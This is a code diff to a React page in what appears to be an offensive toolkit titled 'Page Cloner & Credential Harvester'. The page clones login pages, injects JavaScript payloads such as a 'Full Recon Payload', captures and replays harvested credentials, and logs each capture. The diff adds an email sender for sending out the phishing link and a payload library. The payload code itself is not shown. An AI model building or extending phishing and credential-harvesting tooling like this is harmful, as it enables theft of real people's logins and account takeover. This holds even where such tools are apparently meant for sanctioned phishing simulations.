@@ -10,16 +10,24 @@ import { Separator } from '@/components/ui/separator';
 import { CredentialReplayer } from '@/components/credential-replayer';
 import { PREMADE_PAYLOADS } from '@/lib/js-payloads';
 import type { JsPayload } from '@/types';
+import { logActivity } from '@/services/activity-log-service';
+import { useAuth } from '@/hooks/use-auth';
+import { EmailSender } from '@/components/email-sender';
+import { JavaScriptLibrary } from '@/components/javascript-library';
 
 const storageKey = 'netra-captured-credentials';
 
 export default function PhishingPage() {
   const { toast } = useToast();
+  const { user } = useAuth();
   const [capturedCredentials, setCapturedCredentials] = useState<CapturedCredential[]>([]);
   
   // Find the default recon payload to pre-select it
   const defaultPayload = PREMADE_PAYLOADS.find(p => p.name === "Full Recon Payload") || PREMADE_PAYLOADS[0];
   const [selectedPayload, setSelectedPayload] = useState<JsPayload>(defaultPayload);
+  
+  const [isEmailModalOpen, setIsEmailModalOpen] = useState(false);
+  const [hostedUrlForEmail, setHostedUrlForEmail] = useState<string>('');
 
   const loadCredentialsFromStorage = () => {
     try {
@@ -45,6 +53,11 @@ export default function PhishingPage() {
                   description: "New credentials have been harvested.",
                 });
             }
+            logActivity({
+              user: user?.displayName || 'System',
+              action: 'Captured Credentials',
+              details: `Harvested from phishing page.`
+            });
             setCapturedCredentials(newCredsList);
         } catch (e) {
             console.error('Failed to parse credentials from storage event.', e);
@@ -56,35 +69,51 @@ export default function PhishingPage() {
     return () => {
       window.removeEventListener('storage', handleStorageChange);
     };
-  }, [capturedCredentials.length, toast]);
+  }, [capturedCredentials.length, toast, user]);
 
 
   const handleClearCredentials = () => {
     setCapturedCredentials([]);
     localStorage.removeItem(storageKey);
   };
+  
+  const openEmailModal = (url: string) => {
+    setHostedUrlForEmail(url);
+    setIsEmailModalOpen(true);
+  };
 
   return (
-    <div className="flex flex-col gap-6">
-      <div>
-        <h1 className="font-headline text-3xl font-semibold">Page Cloner & Credential Harvester</h1>
-        <p className="text-muted-foreground">Clone a login page, inject a harvester, and capture credentials in real-time.</p>
+    <>
+      <div className="flex flex-col gap-6">
+        <div>
+          <h1 className="font-headline text-3xl font-semibold">Page Cloner & Credential Harvester</h1>
+          <p className="text-muted-foreground">Clone a login page, inject a harvester, and capture credentials in real-time.</p>
+        </div>
+
+        <div className="grid lg:grid-cols-2 gap-6 items-start">
+           <div className="lg:col-span-1 flex flex-col gap-6">
+            <AdvancedPageCloner selectedPayload={selectedPayload} onSelectPayload={setSelectedPayload} onLinkGenerated={openEmailModal} />
+            <JavaScriptLibrary onSelectPayload={setSelectedPayload}/>
+          </div>
+          
+          <div className="flex flex-col gap-6">
+            <CredentialHarvester 
+              credentials={capturedCredentials} 
+              onClear={handleClearCredentials} 
+              onRefresh={loadCredentialsFromStorage} 
+            />
+          </div>
+        </div>
+        
+        <Separator className="my-8" />
+        <CredentialReplayer />
       </div>
 
-      <div className="grid lg:grid-cols-2 gap-6 items-start">
-        <AdvancedPageCloner selectedPayload={selectedPayload} onSelectPayload={setSelectedPayload} />
-        
-        <div className="flex flex-col gap-6">
-          <CredentialHarvester 
-            credentials={capturedCredentials} 
-            onClear={handleClearCredentials} 
-            onRefresh={loadCredentialsFromStorage} 
-          />
-        </div>
-      </div>
-      
-      <Separator className="my-8" />
-      <CredentialReplayer />
-    </div>
+       <EmailSender
+          isOpen={isEmailModalOpen}
+          onOpenChange={setIsEmailModalOpen}
+          phishingLink={hostedUrlForEmail}
+      />
+    </>
   );
 }
